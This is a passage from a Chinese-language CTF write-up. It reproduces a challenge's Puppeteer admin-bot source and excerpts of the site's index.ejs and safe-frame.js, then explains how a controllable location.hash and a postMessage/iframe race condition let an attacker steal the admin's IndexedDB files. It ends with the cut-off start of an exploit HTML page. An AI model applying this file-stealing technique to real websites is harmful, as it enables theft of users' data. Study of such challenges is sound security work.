class="keyword">const</span> ptUint8 = textEnc.<span class="title function_">encode</span>(plaintext);</span><br><span class="line">  <span class="keyword">const</span> ctBuffer = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">encrypt</span>(alg, key, ptUint8);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctArray = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(ctBuffer));</span><br><span class="line">  <span class="keyword">const</span> ctStr = ctArray.<span class="title function_">map</span>(<span class="function"><span class="params">byte</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(byte)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">btoa</span>(ivStr + ctStr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visitUrl</span>(<span class="params">browser, data, socket</span>) &#123;</span><br><span class="line">  <span class="comment">// 访问 URL</span></span><br><span class="line">  <span class="keyword">const</span> &#123; url, <span class="attr">timeout</span>: bot_timeout &#125; = data;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">async</span> resolve =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="comment">// 先访问了 题目的主页面</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="variable constant_">PAGE_URL</span>);</span><br><span class="line">    <span class="comment">// 应该拿到db.js 向题目环境的db中添加了包含了FLAG的文件</span></span><br><span class="line">    <span class="comment">// 所以我们的目的不是RCE, 而是获取db中的file</span></span><br><span class="line">    <span class="keyword">await</span> page.evaluate(<span class="variable constant_">ADD_NOTES_FUNC</span>, <span class="keyword">await</span> <span class="title function_">generateAdminFiles</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">reload</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">const</span> bodyHTML = <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">innerHTML</span>);</span><br><span class="line">    <span class="keyword">if</span> (bodyHTML.<span class="title function_">includes</span>(<span class="string">&#x27;file-&#x27;</span>) &amp;&amp; bodyHTML.<span class="title function_">includes</span>(<span class="string">&#x27;.txt&#x27;</span>)) &#123;</span><br><span class="line">      <span class="comment">// socket_write(socket, &#x27;Successfully logged in as admin.&#x27;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">socket_write</span>(socket, <span class="string">&#x27;Something went wrong with logging as admin!&#x27;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Something went wrong with logging as admin!&#x27;</span>);</span><br><span class="line">      socket.<span class="title function_">destroy</span>();</span><br><span class="line">      <span class="keyword">return</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断页面是否超时</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="keyword">await</span> context.<span class="title function_">close</span>();</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="title function_">socket_write</span>(socket, <span class="string">&#x27;Timeout\n&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        socket.<span class="title function_">destroy</span>();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, bot_timeout);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="comment">// 访问我们的页面</span></span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">n_browsers</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">browsers</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">queue</span> = <span class="keyword">new</span> <span class="title class_">Deque</span>([]);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addBrowsers</span>(n_browsers);</span><br><span class="line">    <span class="comment">// 调用到this.loop()</span></span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123; <span class="variable language_">this</span>.<span class="title function_">loop</span>() &#125;, <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">addBrowsers</span>(<span class="params">N</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">browsers</span>[i] = &#123;</span><br><span class="line">        <span class="attr">browser</span>: <span class="keyword">await</span> <span class="title function_">launchPup</span>(i),</span><br><span class="line">        <span class="attr">free</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">add</span>(<span class="params">socket, data</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">loop</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">push</span>([socket, data]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Adding <span class="subst">$&#123;data.url&#125;</span> to queue`</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">loop</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 从queue 中选出一个线程来访问队列中的URL</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">browsers</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">queue</span>.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">browsers</span>[i].<span class="property">free</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">browsers</span>[i].<span class="property">free</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">let</span> [socket, data] = <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">shift</span>();</span><br><span class="line">        socket.<span class="property">state</span> = <span class="string">&#x27;LOADING&#x27;</span>;</span><br><span class="line">        <span class="title function_">socket_write</span>(socket, <span class="string">`Visiting: <span class="subst">$&#123;data.url&#125;</span>`</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Visiting <span class="subst">$&#123;data.url&#125;</span>`</span>);</span><br><span class="line">        <span class="comment">// 访问</span></span><br><span class="line">        <span class="title function_">visitUrl</span>(<span class="variable language_">this</span>.<span class="property">browsers</span>[i].<span class="property">browser</span>, data, socket).<span class="title function_">finally</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">browsers</span>[i].<span class="property">free</span> = <span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// will only be used if BLOCK_SUBORIGINS is enabled</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PAC_B64</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">`</span></span><br><span class="line"><span class="string">function FindProxyForURL (url, host) &#123;</span></span><br><span class="line"><span class="string">  if (host == &quot;<span class="subst">$&#123;DOMAIN&#125;</span>&quot;) &#123;</span></span><br><span class="line"><span class="string">    return &#x27;DIRECT&#x27;;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  if (host == &quot;<span class="subst">$&#123;REGISTERED_DOMAIN&#125;</span>&quot; || dnsDomainIs(host, &quot;.<span class="subst">$&#123;REGISTERED_DOMAIN&#125;</span>&quot;)) &#123;</span></span><br><span class="line"><span class="string">    return &#x27;PROXY 127.0.0.1:1&#x27;;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return &#x27;DIRECT&#x27;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span>).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">launchPup</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> r = i || <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">1e18</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> puppeter_args = &#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">args</span>: [</span><br><span class="line">      <span class="string">`--user-data-dir=/tmp/chrome-userdata-<span class="subst">$&#123;r&#125;</span>`</span>,</span><br><span class="line">      <span class="string">`--breakpad-dump-location=/tmp/chrome-crashes=<span class="subst">$&#123;r&#125;</span>`</span>,</span><br><span class="line">      <span class="comment">// &#x27;--block-new-web-contents=true&#x27;,</span></span><br><span class="line">      <span class="comment">// &#x27;--unsafely-treat-insecure-origin-as-secure=http://postviewer:1337&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable constant_">BLOCK_SUBORIGINS</span>) &#123;</span><br><span class="line">    puppeter_args.<span class="property">headless</span> = <span class="literal">false</span>;</span><br><span class="line">    puppeter_args.<span class="property">args</span>.<span class="title function_">push</span>(</span><br><span class="line">      <span class="string">&#x27;--proxy-pac-url=data:application/x-ns-proxy-autoconfig;base64,&#x27;</span> + <span class="variable constant_">PAC_B64</span>,</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> puppeteer.<span class="title function_">launch</span>(puppeter_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">admin_file</span> = (<span class="params">flag_cipher, password, i</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> [</span><br><span class="line">    <span class="string">`\</span></span><br><span class="line"><span class="string">    Congratulations on fetching admin&#x27;s file!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The flag needs to be deciphered with a password that has been split into three</span></span><br><span class="line"><span class="string">    random files. Because the password is random with each run, you will have to</span></span><br><span class="line"><span class="string">    collect all three files. When you do so, just visit:</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;PAGE_URL&#125;</span>/dec1pher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    File info:</span></span><br><span class="line"><span class="string">    Cipher: <span class="subst">$&#123;flag_cipher&#125;</span></span></span><br><span class="line"><span class="string">    Password part [<span class="subst">$&#123;i&#125;</span>/3]: <span class="subst">$&#123;password&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The challenge is easily solvable under 5 seconds, but as a token of appreciation</span></span><br><span class="line"><span class="string">    I set up a secret endpoint for you that have a limit of 20 seconds:</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;PAGE_URL&#125;</span>/bot?s=<span class="subst">$&#123;SECRET_TOKEN&#125;</span></span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="string">`<span class="subst">$&#123;crypto.randomUUID()&#125;</span>.txt`</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">randString</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> randValues = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">3</span>);</span><br><span class="line">  crypto.<span class="title function_">getRandomValues</span>(randValues);</span><br><span class="line">  <span class="keyword">return</span> randValues.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b.<span class="title function_">toString</span>(<span class="number">36</span>), <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 产生FLAG文件 flag在AdminFiles中</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generateAdminFiles</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> password_parts = [<span class="title function_">randString</span>(), <span class="title function_">randString</span>(), <span class="title function_">randString</span>()];</span><br><span class="line">  <span class="keyword">const</span> password = password_parts.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> flag_cipher = <span class="keyword">await</span> <span class="title function_">aesGcmEncrypt</span>(<span class="variable constant_">FLAG</span>, password);</span><br><span class="line">  <span class="keyword">const</span> files = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    files.<span class="title function_">push</span>(<span class="title function_">admin_file</span>(flag_cipher, password_parts[i], i + <span class="number">1</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> files;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ADD_NOTES_FUNC</span> = <span class="keyword">async</span> (<span class="params">files</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> db = <span class="keyword">new</span> <span class="title function_">DB</span>();</span><br><span class="line">  <span class="keyword">await</span> db.<span class="title function_">clear</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [file, name] <span class="keyword">of</span> files) &#123;</span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">addFile</span>(<span class="keyword">new</span> <span class="title class_">File</span>([file], name, &#123; <span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyUrl</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> url = data.<span class="title function_">toString</span>().<span class="title function_">trim</span>();</span><br><span class="line">  <span class="keyword">let</span> timeout = <span class="variable constant_">BOT_TIMEOUT</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> j = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(url);</span><br><span class="line">    url = j.<span class="property">url</span>;</span><br><span class="line">    timeout = j.<span class="property">timeout</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> url !== <span class="string">&quot;string&quot;</span> || (!url.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://&#x27;</span>) &amp;&amp; !url.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123; url, timeout &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">socket_write</span>(<span class="params">socket, data</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    socket.<span class="title function_">write</span>(data + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ask_for_url</span>(<span class="params">socket</span>) &#123;</span><br><span class="line">  socket.<span class="property">state</span> = <span class="string">&#x27;URL&#x27;</span>;</span><br><span class="line">  <span class="title function_">socket_write</span>(socket, <span class="string">&#x27;Please send me a URL to open.\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> queue = <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="variable constant_">MAX_BROWSERS</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">load_url</span>(<span class="params">socket, data</span>) &#123;</span><br><span class="line">    <span class="comment">// 校验提交的URL</span></span><br><span class="line">    data = <span class="title function_">verifyUrl</span>(data);</span><br><span class="line">    <span class="keyword">if</span> (data === <span class="literal">false</span>) &#123;</span><br><span class="line">      socket.<span class="property">state</span> = <span class="string">&#x27;ERROR&#x27;</span>;</span><br><span class="line">      <span class="title function_">socket_write</span>(socket, <span class="string">&#x27;Invalid scheme (http/https only).\n&#x27;</span>);</span><br><span class="line">      socket.<span class="title function_">destroy</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socket.<span class="property">state</span> = <span class="string">&#x27;WAITING&#x27;</span>;</span><br><span class="line">    <span class="comment">// 增加到queue中</span></span><br><span class="line">    <span class="keyword">const</span> pos = queue.<span class="title function_">add</span>(socket, data);</span><br><span class="line">    <span class="title function_">socket_write</span>(socket, <span class="string">`Task scheduled, position in the queue: <span class="subst">$&#123;pos&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> server = net.<span class="title function_">createServer</span>();</span><br><span class="line">  server.<span class="title function_">listen</span>(<span class="number">1338</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listening on port 1338&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  server.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function"><span class="params">socket</span> =&gt;</span> &#123;</span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (socket.<span class="property">state</span> == <span class="string">&#x27;URL&#x27;</span>) &#123;</span><br><span class="line">          <span class="title function_">load_url</span>(socket, data);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">ask_for_url</span>(socket);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`err: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>然后发现<code>index.ejs</code>,里面也添加了许多的方法，对于网站功能实现。（主要是上面的bot，很明显能看出是xss然后偷文件)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">const</span> <span class="title function_">processHash</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        $(<span class="string">&quot;#previewModal&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (location.<span class="property">hash</span>.<span class="property">length</span> &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//这里的location.hash是完全可控的</span></span><br><span class="line">        <span class="keyword">const</span> fileDiv = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(location.<span class="property">hash</span>);</span><br><span class="line">        <span class="keyword">if</span> (fileDiv === <span class="literal">null</span> || !fileDiv.<span class="property">dataset</span>.<span class="property">name</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">const</span> file = <span class="keyword">await</span> db.<span class="title function_">getFile</span>(fileDiv.<span class="property">dataset</span>.<span class="property">name</span>);</span><br><span class="line">        <span class="title function_">previewFile</span>(file);</span><br><span class="line">        <span class="comment">/* If modal is not shown remove hash */</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$(<span class="string">&#x27;#previewModal&#x27;</span>).<span class="title function_">hasClass</span>(<span class="string">&#x27;show&#x27;</span>)) &#123;</span><br><span class="line">                location.<span class="property">hash</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, processHash, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> files = <span class="keyword">await</span> db.<span class="title function_">getFiles</span>();</span><br><span class="line">        files.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">date</span> - b.<span class="property">date</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> fileInfo <span class="keyword">of</span> files) &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">appendFileInfo</span>(fileInfo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">processHash</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">data</span> == <span class="string">&#x27;blob loaded&#x27;</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#previewModal&quot;</span>).<span class="title function_">modal</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>截取出两个关键的方法，现在有了第一个漏洞点了。我们继续看<code>safe-frame.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">previewIframe</span>(<span class="params">container, body, mimeType</span>) &#123;</span><br><span class="line">    <span class="comment">// 当我们点击previewFiles 就会触发这个函数</span></span><br><span class="line">    <span class="comment">// 这里实现的功能相当于： 我们点击了previewFiles 点击的是我们选中的files</span></span><br><span class="line">    <span class="comment">// 然后这个iframe 就开始localtion</span></span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">    iframe.<span class="property">src</span> = <span class="variable constant_">SHIM_DATA_URL</span>;</span><br><span class="line">    container.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">    iframe.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        iframe.<span class="property">contentWindow</span>?.<span class="title function_">postMessage</span>(&#123; body, mimeType &#125;, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    &#125;, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一句关键方法。也是对于上面文件预览的实现。然后题目做到完整的功能几乎已经介绍完毕了。这里需要思考的是</p>
<blockquote>
<p>如果我们提交bot的url是题目的某个页面，我们在本地进行的所有操作是不会影响到他的，因为文件是存储在<code>indexDB</code>。那么还有什么办法呢？</p>
</blockquote>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>我们首先注意到<code>index.ejs</code>中，存在了<code>message</code>事件监听，那么我们可以把他嵌套到iframe中，然后通过我们的网站上的js代码去操作这个iframe，进而达到更深地利用。那么最好的情况是什么呢？</p>
<ul>
<li><p>题目页面加载完毕，但是还没有执行<code>load</code></p>
</li>
<li><p>我们的xss代码执行完毕。</p>
</li>
<li><p>然后题目继续load。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">iframe.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        iframe.<span class="property">contentWindow</span>?.<span class="title function_">postMessage</span>(&#123; body, mimeType &#125;, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    &#125;, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>也就是卡在上面这一段代码之前执行。<code>题目卡住了？网页还会继续加载吗？</code>我们知道<code>iframe</code>和网页本身是进程隔离的，原来是为了避免其他来源的数据对于本页面的污染，但是在这里反而导致了<code>条件竞争</code>。也就是我们在主线程卡住的时候，依然可以像题目添加的iframe里面postmessage, 页面里面的iframe依然会进行载入，所以只要我们隔一段时间去，然后他就可以运行我们js。这个时候我们的代码已经注入进去了，然后他带file进来了，我们就可以获取到资料了。</p>
<p>参考。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220720185009058.png" alt="image-20220720185009058"></p>
<p>官方题解：<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710%E3%80%82%E5%8F%AF%E4%BB%A5%E8%AF%B4%E5%AD%A6%E4%B9%A0%E5%88%B0%E4%BA%86%E8%AE%B8%E5%A4%9A%EF%BC%8C%60%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%60%E7%9C%9F%E7%89%9B%E3%80%82%E6%9C%80%E5%90%8E%E5%B0%B1%E6%98%AF%E6%8A%8A%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E7%9A%84exp%EF%BC%8C%E6%94%BE%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%E4%B8%8A%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%A9bot%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%9A%84url%E3%80%82">https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710。可以说学习到了许多，`条件竞争`真牛。最后就是把官方题解的exp，放到自己的网站上，然后让bot访问你的url。</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POC Vulnerable website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Click me!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;width:1px;height:1px&quot;</span> <span class="attr">name</span>=<span class="string">&quot;loop&quot;</span>&gt;</span><span 